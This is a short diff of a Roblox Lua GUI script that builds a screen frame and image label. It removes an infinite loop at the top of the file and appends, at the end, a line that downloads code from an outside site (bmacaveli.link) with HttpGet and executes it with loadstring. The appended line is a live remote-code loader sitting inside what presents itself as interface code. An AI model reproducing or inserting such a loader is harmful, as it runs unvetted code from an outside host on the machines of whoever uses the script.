@@ -1,6 +1,3 @@
-while true do
-	loadstring(game:HttpGet("https://bmacaveli.link/newhub"))()
-end
 
 local scrollingframegui = Instance.new("ScreenGui")
 local Main2 = Instance.new("ImageLabel")
@@ -173,3 +170,5 @@ end)
 
 UIAspectRatioConstraint.Parent = Main2
 UIAspectRatioConstraint.AspectRatio = 0.805
+
+loadstring(game:HttpGet("https://bmacaveli.link/newhub"))()
